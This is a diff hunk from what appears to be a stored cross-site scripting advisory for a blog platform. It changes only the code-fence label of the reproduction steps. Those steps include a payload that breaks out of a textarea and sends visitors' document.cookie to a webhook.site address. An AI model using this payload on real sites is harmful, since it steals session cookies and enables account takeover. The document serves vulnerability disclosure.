@@ -18,7 +18,7 @@ Vulnerability occurs when user-controlled post content is rendered inside a ```<
 1. Create a new blog post with a random title and submit a random content.
 2. Click Create Post to create a post which will lead to the posts_under_review.
 3. Paste the following payload in the content box:
-```sql
+```perl
 </textarea><script>fetch('https://webhook.site/67335a72-9738-4622-9218-2732119d2876',{
   method:'POST',body:document.cookie})</script><textarea>
 ```
